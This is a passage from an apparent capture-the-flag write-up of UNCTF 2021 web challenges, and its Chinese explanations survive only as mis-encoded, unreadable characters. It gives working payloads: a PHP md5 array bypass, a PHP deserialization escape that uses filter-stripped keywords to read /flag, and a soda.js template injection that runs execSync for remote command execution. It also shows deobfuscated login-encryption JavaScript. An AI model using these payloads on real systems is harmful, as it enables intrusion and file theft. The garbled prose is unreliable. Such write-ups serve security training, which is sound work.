class="string">&#x27;email&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>= <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$u</span> = <span class="keyword">new</span> <span class="title function_ invoke__">UNCTF</span>(<span class="variable">$pass</span>,<span class="variable">$email</span>,<span class="variable">$name</span>);</span><br><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$u</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span>(<span class="variable">$action</span>)&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;function.php&#x27;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>) &amp;&amp; <span class="variable">$a</span> !=<span class="variable">$b</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$s</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p>POSTä¼ å…¥ <code>action=1</code>ï¼Œå¾—åˆ° <code>function.php</code> æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">me7eorite</span></span>&#123;</span><br><span class="line">    <span class="comment">//test  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$safe</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;safe = <span class="string">&quot;/etc/passwd&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">UNCTF</span>(&#x27;<span class="title">me7eorite</span>&#x27;,&#x27;<span class="title">me7eorite</span>@<span class="title">qq</span>.<span class="title">com</span>&#x27;,&#x27;<span class="title">me7eorite</span>&#x27;);           </span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">__toString</span>()</span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getShell</span>();</span></span><br><span class="line"><span class="class">        <span class="title">return</span> &#x27;&#x27;;</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">getShell</span>()</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">readfile</span>(<span class="variable">$this</span>-&gt;safe);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UNCTF</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pass</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$email</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$pass</span>,<span class="variable">$email</span>,<span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;pass  = <span class="variable">$pass</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;email = <span class="variable">$email</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getShell</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;flag&#123;this_is_fake&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;name . <span class="string">&#x27;Welcome to UNCTF 2021!&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€å±‚ï¼ŒPHPå¼±æ¯”è¾ƒç‰¹æ€§ï¼Œæ•°ç»„ç»•è¿‡ï¼Œä¼ å…¥ <code>?a[]=1&amp;b[]=2</code>ï¼›</p><p>ç¬¬äºŒå±‚ï¼ŒPHPåºåˆ—åŒ–+ååºåˆ—åŒ–ï¼Œ<code>filter()</code> åˆ é™¤ä¸‰ç§å…³é”®å­—ï¼Œæ˜æ˜¾çš„å‡å­—ç¬¦å‹ååºåˆ—åŒ–é€ƒé€¸ã€‚</p><p>æœ¬åœ°æµ‹è¯•ï¼Œå…ˆæ­£å¸¸POSTä¼ å€¼ <code>name=z&amp;pass=x&amp;email=y</code>ï¼Œå¾—åˆ°åºåˆ—åŒ–å­—ç¬¦ä¸²ï¼š</p><p><code>O:5:&quot;UNCTF&quot;:3:&#123;s:4:&quot;pass&quot;;s:3:&quot;x&quot;;s:5:&quot;email&quot;;s:3:&quot;y&quot;;s:4:&quot;name&quot;;s:3:&quot;z&quot;;&#125;</code>ã€‚</p><p>è§‚å¯Ÿåˆ©ç”¨é“¾ï¼šç±»<code>UNCTF</code> çš„ <code>__destruct()</code> ä¸­ï¼Œæ§åˆ¶ <code>$this-&gt;name</code> å¯ä»¥è§¦å‘ç±» <code>me7eorite</code> çš„ <code>__toString()</code>ï¼Œæ§åˆ¶ <code>$this-&gt;class</code> ä¸ºæ–°çš„ <code>me7eorite</code> å¯¹è±¡ï¼Œé¿å…è°ƒç”¨ç±» <code>UNCTF</code> çš„ <code>getShell()</code>ï¼Œè€Œè°ƒç”¨ç±» <code>me7eorite</code> çš„ <code>getShell()</code>ï¼Œå†æ§åˆ¶ <code>$this-&gt;safe</code> å¯ä»»æ„è¯»ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">...</span><br><span class="line"><span class="variable">$y</span> = <span class="keyword">new</span> me7eorite;</span><br><span class="line"><span class="variable">$x</span> = <span class="keyword">new</span> me7eorite;</span><br><span class="line"><span class="variable">$x</span>-&gt;safe = <span class="string">&#x27;/etc/passwd&#x27;</span>;</span><br><span class="line"><span class="variable">$x</span>-&gt;<span class="class"><span class="keyword">class</span> = $<span class="title">y</span>;</span></span><br><span class="line"><span class="class">$<span class="title">name</span> = $<span class="title">x</span>;</span></span><br><span class="line"><span class="class">$<span class="title">pass</span> = &#x27;<span class="title">x</span>&#x27;;</span></span><br><span class="line"><span class="class">$<span class="title">email</span> = &#x27;<span class="title">y</span>&#x27;;</span></span><br><span class="line"><span class="class">$<span class="title">u</span> = <span class="title">new</span> <span class="title">UNCTF</span>($<span class="title">pass</span>,$<span class="title">email</span>,$<span class="title">name</span>);</span></span><br><span class="line"><span class="class">$<span class="title">s</span> = <span class="title">serialize</span>($<span class="title">u</span>);</span></span><br><span class="line"><span class="class"><span class="title">echo</span> $<span class="title">s</span>;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">// <span class="title">O</span>:5:&quot;<span class="title">UNCTF</span>&quot;:3:</span>&#123;s:<span class="number">4</span>:<span class="string">&quot;pass&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;x&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;email&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;y&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;O:<span class="number">9</span>:<span class="string">&quot;me7eorite&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;safe&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;/etc/passwd&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;class&quot;</span>;O:<span class="number">9</span>:<span class="string">&quot;me7eorite&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;safe&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;/etc/passwd&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;class&quot;</span>;O:<span class="number">5</span>:<span class="string">&quot;UNCTF&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;pass&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;me7eorite&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;email&quot;</span>;s:<span class="number">16</span>:<span class="string">&quot;me7eorite@qq.com&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;me7eorite&quot;</span>;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>ç”±äºèƒ½POSTä¼ å…¥çš„åªæœ‰åºåˆ—åŒ–éƒ¨åˆ†çš„ç±» <code>UNCTF</code> å‚æ•°ï¼Œå¯ä»¥é€šè¿‡ç»™ <code>name</code> ä¼ å…¥æ¶æ„åºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œ<code>serialize()</code> åæˆªæ–­æ­£å¸¸çš„åºåˆ—åŒ–å­—ç¬¦ä¸²ï¼›ç»™<code>email</code> ä¼ å…¥è¿‡æ»¤å…³é”®å­—ï¼Œ<code>filter()</code> ä¹‹åä½¿åŸæœ‰é•¿åº¦å€¼ä¸éœ€å»é™¤çš„æ­£å¸¸å­—ç¬¦ä¸²é•¿åº¦ç›¸ç­‰ï¼Œä¿ç•™æ¶æ„åºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œæœ€åç» <code>unserialize()</code> æ§åˆ¶ååºåˆ—åŒ–è¿‡ç¨‹å®Œæˆåˆ©ç”¨é“¾ã€‚</p><p>å°è¯•ä¼ å€¼ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">...</span><br><span class="line"><span class="variable">$name</span> = <span class="string">&#x27;z&quot;;s:4:&quot;name&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:11:&quot;/etc/passwd&quot;;s:5:&quot;class&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:11:&quot;/etc/passwd&quot;;s:5:&quot;class&quot;;O:5:&quot;UNCTF&quot;:3:&#123;s:4:&quot;pass&quot;;s:9:&quot;me7eorite&quot;;s:5:&quot;email&quot;;s:16:&quot;me7eorite@qq.com&quot;;s:4:&quot;name&quot;;s:9:&quot;me7eorite&quot;;&#125;&#125;&#125;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$pass</span> = <span class="string">&#x27;x&#x27;</span>;</span><br><span class="line"><span class="variable">$email</span> = <span class="string">&#x27;phpphp&#x27;</span>;</span><br><span class="line"><span class="variable">$u</span> = <span class="keyword">new</span> <span class="title function_ invoke__">UNCTF</span>(<span class="variable">$pass</span>,<span class="variable">$email</span>,<span class="variable">$name</span>);</span><br><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$u</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// O:5:&quot;UNCTF&quot;:3:&#123;s:4:&quot;pass&quot;;s:1:&quot;x&quot;;s:5:&quot;email&quot;;s:6:&quot;phpphp&quot;;s:4:&quot;name&quot;;s:245:&quot;z&quot;;s:4:&quot;name&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:11:&quot;/etc/passwd&quot;;s:5:&quot;class&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:11:&quot;/etc/passwd&quot;;s:5:&quot;class&quot;;O:5:&quot;UNCTF&quot;:3:&#123;s:4:&quot;pass&quot;;s:9:&quot;me7eorite&quot;;s:5:&quot;email&quot;;s:16:&quot;me7eorite@qq.com&quot;;s:4:&quot;name&quot;;s:9:&quot;me7eorite&quot;;&#125;&#125;&#125;&#125;ã€&quot;;&#125;z&quot;;s:4:&quot;name&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:11:&quot;/etc/passwd&quot;;s:5:&quot;class&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:11:&quot;/etc/passwd&quot;;s:5:&quot;class&quot;;O:5:&quot;UNCTF&quot;:3:&#123;s:4:&quot;pass&quot;;s:9:&quot;me7eorite&quot;;s:5:&quot;email&quot;;s:16:&quot;me7eorite@qq.com&quot;;s:4:&quot;name&quot;;s:9:&quot;me7eorite&quot;;&#125;&#125;&#125;&#125;ã€‘æˆªæ–­</span></span><br></pre></td></tr></table></figure><p>è®¡ç®—éœ€å»é™¤çš„æ­£å¸¸å­—ç¬¦ä¸² <code>&quot;;s:4:&quot;name&quot;;s:245:&quot;z</code> é•¿åº¦ä¸º21ï¼Œåˆ™ä½¿å¾—åŸæœ‰é•¿åº¦å€¼ä¸éœ€å»é™¤çš„æ­£å¸¸å­—ç¬¦ä¸²é•¿åº¦ç›¸ç­‰ï¼Œåˆ™éœ€è¦ <code>21/len(&#39;php&#39;)=21/3=7</code> ä¸ª <code>php</code> ï¼Œå†å°† <code>/etc/passwd</code> æ¢æˆ <code>/flag</code>ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">...</span><br><span class="line"><span class="variable">$name</span> = <span class="string">&#x27;z&quot;;s:4:&quot;name&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:5:&quot;/flag&quot;;s:5:&quot;class&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:5:&quot;/flag&quot;;s:5:&quot;class&quot;;O:5:&quot;UNCTF&quot;:3:&#123;s:4:&quot;pass&quot;;s:9:&quot;me7eorite&quot;;s:5:&quot;email&quot;;s:16:&quot;me7eorite@qq.com&quot;;s:4:&quot;name&quot;;s:9:&quot;me7eorite&quot;;&#125;&#125;&#125;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$pass</span> = <span class="string">&#x27;x&#x27;</span>;</span><br><span class="line"><span class="variable">$email</span> = <span class="string">&#x27;phpphpphpphpphpphpphp&#x27;</span>;</span><br><span class="line"><span class="variable">$u</span> = <span class="keyword">new</span> <span class="title function_ invoke__">UNCTF</span>(<span class="variable">$pass</span>,<span class="variable">$email</span>,<span class="variable">$name</span>);</span><br><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$u</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// O:5:&quot;UNCTF&quot;:3:&#123;s:4:&quot;pass&quot;;s:1:&quot;x&quot;;s:5:&quot;email&quot;;s:21:&quot;phpphpphpphpphpphpphp&quot;;s:4:&quot;name&quot;;s:231:&quot;z&quot;;s:4:&quot;name&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:5:&quot;/flag&quot;;s:5:&quot;class&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:5:&quot;/flag&quot;;s:5:&quot;class&quot;;O:5:&quot;UNCTF&quot;:3:&#123;s:4:&quot;pass&quot;;s:9:&quot;me7eorite&quot;;s:5:&quot;email&quot;;s:16:&quot;me7eorite@qq.com&quot;;s:4:&quot;name&quot;;s:9:&quot;me7eorite&quot;;&#125;&#125;&#125;&#125;ã€&quot;;&#125;z&quot;;s:4:&quot;name&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:5:&quot;/flag&quot;;s:5:&quot;class&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:5:&quot;/flag&quot;;s:5:&quot;class&quot;;O:5:&quot;UNCTF&quot;:3:&#123;s:4:&quot;pass&quot;;s:9:&quot;me7eorite&quot;;s:5:&quot;email&quot;;s:16:&quot;me7eorite@qq.com&quot;;s:4:&quot;name&quot;;s:9:&quot;me7eorite&quot;;&#125;&#125;&#125;&#125;ã€‘æˆªæ–­</span></span><br></pre></td></tr></table></figure><p>æ³¨æ„ <code>flag</code> ä¹Ÿè¢«è¿‡æ»¤ï¼ŒåŒå†™ç»•è¿‡å³å¯ã€‚</p><p>Payloadï¼š</p><p><code>http://xxx?a[]=1&amp;b[]=2</code>ï¼ŒPOSTä¼ å‚ </p><p><code>name=z&quot;;s:4:&quot;name&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:5:&quot;/flflagag&quot;;s:5:&quot;class&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:5:&quot;/flflagag&quot;;s:5:&quot;class&quot;;O:5:&quot;UNCTF&quot;:3:&#123;s:4:&quot;pass&quot;;s:9:&quot;me7eorite&quot;;s:5:&quot;email&quot;;s:16:&quot;me7eorite@qq.com&quot;;s:4:&quot;name&quot;;s:9:&quot;me7eorite&quot;;&#125;&#125;&#125;&#125;&amp;pass=x&amp;email=phpphpphpphpphpphpphp</code></p><p>flagï¼š<code>UNCTF&#123;bc9b3f89-bed6-4bc3-a211-b9eed8612af7&#125;</code></p><p>â€‹    </p><h3 id="nodejs-ssti"><a href="#nodejs-ssti" class="headerlink" title="nodejs_ssti"></a>nodejs_ssti</h3><p>ä¸€ä¸ªè¾“å…¥æ¡†å’Œæäº¤æŒ‰é’®ï¼Œå°è¯•SSTIè¾“å…¥ <code>&#123;&#123;2*3&#125;&#125;</code> ï¼Œå‘ç°åˆ©ç”¨ç‚¹åœ¨titleå€¼ã€‚</p><p>å°è¯• <code>&#123;&#123;print(xx)&#125;&#125;</code> å‡ºç°æŠ¥é”™ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">TypeError: getValue(...) is not a function</span><br><span class="line">    at sodaExp (eval at getEvalFunc (/app/node_modules/sodajs/dist/soda.js:266:28), &lt;anonymous&gt;:1:63)</span><br><span class="line">    at Soda.parseSodaExpression (/app/node_modules/sodajs/dist/soda.js:403:42)</span><br><span class="line">    at /app/node_modules/sodajs/dist/soda.js:188:44</span><br><span class="line">    at String.replace (&lt;anonymous&gt;)</span><br><span class="line">    at compile (/app/node_modules/sodajs/dist/soda.js:187:53)</span><br><span class="line">    at /app/node_modules/sodajs/dist/soda.js:257:21</span><br><span class="line">    at Array.map (&lt;anonymous&gt;)</span><br><span class="line">    at compile (/app/node_modules/sodajs/dist/soda.js:256:55)</span><br><span class="line">    at Soda.compileNode (/app/node_modules/sodajs/dist/soda.js:261:13)</span><br><span class="line">    at /app/node_modules/sodajs/dist/soda.js:130:23</span><br></pre></td></tr></table></figure><p>è¯´æ˜ä»£ç ä½¿ç”¨çš„æ˜¯soda.jsï¼Œå®é™…æ˜¯node.jsæ³¨å…¥ï¼Œåˆ©ç”¨node.jsç‰¹æ€§ä½¿ç”¨ <code>child_process</code> è°ƒç”¨ <code>execSync()</code> æ–¹æ³•RCEã€‚</p><p>Payloadï¼š</p><p><code>http://xxx/who</code></p><p>POSTä¼ å‚ <code>name=&#123;&#123;" ".toString.constructor("return global.process.mainModule.constructor._load('child_process').execSync('cat /flag').toString()")()&#125;&#125;&amp;brand=web</code></p><p>flagï¼š<code>UNCTF&#123;45d9452b-630a-4ffa-b963-f0da57cf0e79&#125;</code></p><p>â€‹    </p><h3 id="encrypt-login"><a href="#encrypt-login" class="headerlink" title="encrypt_login"></a>encrypt_login</h3><blockquote><p>å¬è¯´ä½ å¾ˆæ“…é•¿æ’åº“ï¼Ÿ</p></blockquote><p>éšä¾¿è¾“å…¥ç”¨æˆ·åå¯†ç ï¼Œè¿”å›æç¤ºå¯†ç ä¸ºçº¯æ•°å­—ï¼š</p><p><code>I can tell you my name is admin and my password is made by number only. This time, you can not to buster my password :)</code></p><p>æŸ¥çœ‹æºç å‘ç°å‰ç«¯åŠ å¯†jsæ–‡ä»¶ <code>encrypto.js</code>ï¼Œä»£ç å·²æ··æ·†ï¼Œæ ¹æ® <code>jsjiami.com.v6</code> å­—æ ·ï¼Œä½¿ç”¨ <a href="https://jsdec.js.org/">JSDec</a> åœ¨çº¿è§£æ··æ·†æœ‰ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *Progcessed By JSDec in 0.01s</span></span><br><span class="line"><span class="comment"> *JSDec - JSDec.js.org</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">$(<span class="string">&#x27;#submit&#x27;</span>)[<span class="string">&#x27;click&#x27;</span>](<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> _0x326c0f = &#123;</span><br><span class="line">        <span class="string">&#x27;DTeqY&#x27;</span>: <span class="keyword">function</span>(<span class="params">_0x1553aa, _0x4bb167</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> _0x1553aa == _0x4bb167;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&#x27;IeKGb&#x27;</span>: <span class="keyword">function</span>(<span class="params">_0x2ec083, _0x47b18b, _0x120b6a</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_">_0x2ec083</span>(_0x47b18b, _0x120b6a);</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&#x27;foePj&#x27;</span>: <span class="string">&#x27;-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQD6US5bbJ7JrsKYeSa8goPJQBgU\nWXdNyUxtPfcwuCrsYEcWNdnk1fpIdSfUvrku39fYl+h1ciyanp5H79uSzuqsUrPE\nHzb2y+GTqdmNzZ53JPcxrFlYMv3NX0EOk3qMzgcSV/qXcAc+fWxLSTV5OVeWV8Lr\nKJVXPMuQVgrw/SxkBQIDAQAB\n-----END PUBLIC KEY-----&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;iaWKq&#x27;</span>: <span class="keyword">function</span>(<span class="params">_0x1c6939, _0x219dc9</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> _0x1c6939 + _0x219dc9;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&#x27;PUpKG&#x27;</span>: <span class="keyword">function</span>(<span class="params">_0x213ed6, _0xe318d3</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> _0x213ed6 + _0xe318d3;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&#x27;JNTjF&#x27;</span>: <span class="string">&#x27;#username&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;OSnwF&#x27;</span>: <span class="keyword">function</span>(<span class="params">_0xd115dc, _0x2bfff6</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_">_0xd115dc</span>(_0x2bfff6);</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&#x27;bZMhU&#x27;</span>: <span class="string">&#x27;post&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;otSyR&#x27;</span>: <span class="keyword">function</span>(<span class="params">_0x486713, _0x17d2bc</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> _0x486713 + _0x17d2bc;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">var</span> _0x5182d1 = <span class="keyword">new</span> <span class="title class_">JSEncrypt</span>();</span><br><span class="line">    <span class="keyword">let</span> _0x20b0a1 = _0x326c0f[<span class="string">&#x27;foePj&#x27;</span>];</span><br><span class="line">    _0x5182d1[<span class="string">&#x27;setPublicKey&#x27;</span>](_0x20b0a1);</span><br><span class="line">    <span class="keyword">var</span> _0x4833f6 = _0x5182d1[<span class="string">&#x27;encrypt&#x27;</span>](_0x326c0f[<span class="string">&#x27;iaWKq&#x27;</span>](_0x326c0f[<span class="string">&#x27;PUpKG&#x27;</span>]($(_0x326c0f[<span class="string">&#x27;JNTjF&#x27;</span>])[<span class="string">&#x27;val&#x27;</span>](), <span class="string">&#x27;|-|&#x27;</span>), _0x326c0f[<span class="string">&#x27;OSnwF&#x27;</span>]($, <span class="string">&#x27;#password&#x27;</span>)[<span class="string">&#x27;val&#x27;</span>]()));</span><br><span class="line">    $[<span class="string">&#x27;ajax&#x27;</span>](&#123;</span><br><span class="line">        <span class="string">&#x27;url&#x27;</span>: <span class="string">&#x27;login.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;type&#x27;</span>: _0x326c0f[<span class="string">&#x27;bZMhU&#x27;</span>],</span><br><span class="line">        <span class="string">&#x27;data&#x27;</span>: _0x326c0f[<span class="string">&#x27;otSyR&#x27;</span>](<span class="string">&#x27;data=&#x27;</span>, _0x4833f6),</span><br><span class="line">        <span class="string">&#x27;success&#x27;</span>: <span class="keyword">function</span>(<span 